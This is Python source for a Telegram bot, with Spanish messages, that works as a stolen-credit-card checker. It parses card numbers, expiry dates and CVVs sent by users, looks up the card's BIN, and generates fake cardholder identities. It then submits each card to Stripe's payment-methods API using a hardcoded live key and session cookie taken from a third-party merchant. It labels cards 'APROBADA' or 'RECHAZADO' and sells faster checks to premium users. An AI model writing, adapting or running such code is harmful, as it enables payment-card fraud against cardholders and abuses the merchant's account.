import time
import random
import string
import requests
import re
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from values import *  # Se asume que contiene: verified_gps, waste_cards, banned_bins, antidb, maindb, etc.

headers = {
    "authority": "my.smashgo.co",
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "PHPSESSID=0417s6hhofc6cgd4g5tbi72bge",
    "origin": "https://my.smashgo.co",
    "referer": "https://my.smashgo.co/account/membership-checkout/?level=8",
    "user-agent": "Mozilla/5.0"
}

sk_headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

@Client.on_message(filters.command(["ca"], [".", "/", "!"]) & filters.text)
async def ca(client, message):
    started_time = time.time()
    try:
        user_id = message.from_user.id
        nombre = message.from_user.first_name

        find = maindb.find_one({"_id": user_id})
        if not find:
            await message.reply_text(use_not_registered, reply_to_message_id=message.id)
            return

        rol = find["status"]

        if rol == "F" and message.chat.type == 'private':
            await message.reply_text(buy_premium, reply_to_message_id=message.id)
            return

        last_time_bytes = antidb.get(user_id)
        spam_time = 999
        if last_time_bytes:
            antispam_time = int(last_time_bytes.decode("utf-8"))
            spam_time = int(time.time()) - antispam_time

        if rol == "P" and spam_time < 10:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo después de {10 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return
        elif rol == "F" and spam_time < 60:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo después de {60 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return

        antidb.set(user_id, str(int(time.time())))

        text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> PROCESS: <b>□□□□□□□□□□ 0%</b>
<b>【〄】</b> CHECKING BY: <b><a href="tg://user?id={user_id}">{nombre}</a> - {rol}</b>
<b>【〄】</b> TIME TAKING: {round(time.time() - started_time, 2)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        msg = await message.reply_text(text=text, reply_to_message_id=message.id)
        await client.send_chat_action(message.chat.id, "typing")

        text_to_check = message.reply_to_message.text if message.reply_to_message else message.text
        input_nums = re.findall(r"\d+", text_to_check)

        if not input_nums or len(input_nums) < 3:
            await msg.edit_text("Formato de tarjeta inválido.")
            return

        try:
            if len(input_nums) == 3:
                cc, mes_ano, cvv = input_nums
                mes = mes_ano[:2]
                ano = mes_ano[2:]
            elif len(input_nums) >= 4:
                cc, mes, ano, cvv = input_nums[:4]
            else:
                await msg.edit_text("Tu tarjeta está incompleta o en formato inválido.")
                return

            if len(mes) > 2:
                ano, cvv, mes = cvv, mes, ano
        except Exception:
            await msg.edit_text("Error al procesar la tarjeta.")
            return

        if int(cc[0]) in waste_cards or len(cc) not in [15, 16]:
            await msg.edit_text("Número de tarjeta inválido.")
            return
        if len(mes) not in [2, 4] or not mes.isdigit() or not ('01' <= mes <= '12'):
            await msg.edit_text("Mes inválido.")
            return
        if len(ano) not in [2, 4] or not ano.isdigit():
            await msg.edit_text("Año inválido.")
            return
        if (int(cc[0]) == 3 and len(cvv) != 4) or len(cvv) not in [3, 4]:
            await msg.edit_text("CVV inválido.")
            return

        lista = f"{cc}|{mes}|{ano}|{cvv}"
        bin_code = cc[:6]

        res = requests.get(f"https://lookup.binlist.net/{bin_code}")
        if res.status_code != 200:
            await msg.edit_text("Error al consultar el BIN.")
            return

        bin_data = res.json()
        if f"{bin_code}\n" in banned_bins:
            await msg.edit_text("El BIN está baneado.")
            return

        bank = bin_data.get("bank", {}).get("name", "N/A")
        country = bin_data.get("country", {}).get("name", "N/A")
        tipo = bin_data.get("type", "N/A").upper()
        nivel = bin_data.get("brand", "N/A")

        curl = requests.Session()
        rand_user = requests.get("https://randomuser.me/api/?nat=us&inc=name,location").json()
        first_name = rand_user['results'][0]['name']['first']
        last_name = rand_user['results'][0]['name']['last']
        email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@gmail.com'

        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'key': 'pk_live_51HGdXUCXgKhUdQ35qYXUKcjbluFQq0AIPhLy3P83tUjGeQ1zbC2wMKiPLVVfuJOvEc2r2hQl4CqDucjHhaQS6a0x00rP7pEwU0',
        }

        r1 = curl.post("https://api.stripe.com/v1/payment_methods", headers=sk_headers, data=data)
        j1 = r1.json()

        if 'error' in j1:
            await msg.edit_text(f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> INPUT: <code>{lista}</code>
<b>【〄】</b> RESULT: <b>RECHAZADO❌ [{j1['error']['message']}]</b>
<b>【〄】</b> BANK INFO: <b>{bank} - {country} - {tipo} - {nivel}</b>
""", reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("「OWNER」", url="https://t.me/gsmdiego"),
                    InlineKeyboardButton("「SOPORTE」", url="https://t.me/admin2username")
                ]
            ]))
            return

        pm_id = j1.get("id")
        if not pm_id:
            await msg.edit_text("Error desconocido al obtener el ID del método de pago.")
            return

        await msg.edit_text(f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [1]</b>
<b>【〄】</b> INPUT: <code>{lista}</code>
<b>【〄】</b> RESULT: <b>APROBADA ✅ (CARGA POSIBLE)</b>
<b>【〄】</b> BANK INFO: <b>{bank} - {country} - {tipo} - {nivel}</b>
<b>【〄】</b> TIME TAKEN: {round(time.time() - started_time, 2)}s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
""", reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("「OWNER」", url="https://t.me/gsmdiego"),
                InlineKeyboardButton("「SOPORTE」", url="https://t.me/admin2username")
            ]
        ]))
    except Exception as e:
        await message.reply_text(f"Ocurrió un error: <code>{e}</code>", reply_to_message_id=message.id)
